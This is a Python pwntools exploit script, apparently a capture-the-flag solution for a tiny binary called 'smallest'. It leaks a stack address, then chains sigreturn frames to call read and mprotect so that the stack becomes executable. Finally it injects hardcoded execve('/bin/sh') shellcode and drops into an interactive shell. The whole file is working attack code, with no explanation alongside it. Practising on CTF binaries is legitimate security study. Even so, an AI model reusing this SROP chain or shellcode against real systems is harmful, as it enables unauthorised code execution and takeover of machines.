# -*-coding:utf-8-*-
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
r = process("./smallest")
syscall_addr = 0x4000BE
start_addr = 0x4000B0
payload = p64(start_addr)
payload += p64(start_addr)#fill
payload += p64(start_addr)#fill
r.send(payload)
raw_input("joker")
#write infor leak
r.send("\xb3")#write 2 start_addr last byte
data = r.recv(8)
data = r.recv(8)
stack_addr = u64(data)
print "[*]:stack:{0}".format(hex(stack_addr))
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x300
frame.rsp = stack_addr
frame.rip = syscall_addr
payload = p64(start_addr)
payload += p64(syscall_addr)
payload += str(frame)
r.send(payload)
raw_input("joker")
payload = p64(0x4000B3)#fill
payload += p64(0x4000B3)#fill
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn
frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = (stack_addr&0xfffffffffffff000)
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = stack_addr + 0x108
frame.rip = syscall_addr
payload = p64(start_addr)
payload += p64(syscall_addr)
payload += str(frame)
payload += p64(stack_addr + 0x108 + 8)
#payload += cyclic(0x100)#addr ====> start_addr + 0x108
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"#shellcode
r.send(payload)
raw_input("joker")
payload = p64(0x4000B3)#fill
payload += p64(0x4000B3)#fill
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn
r.interactive()
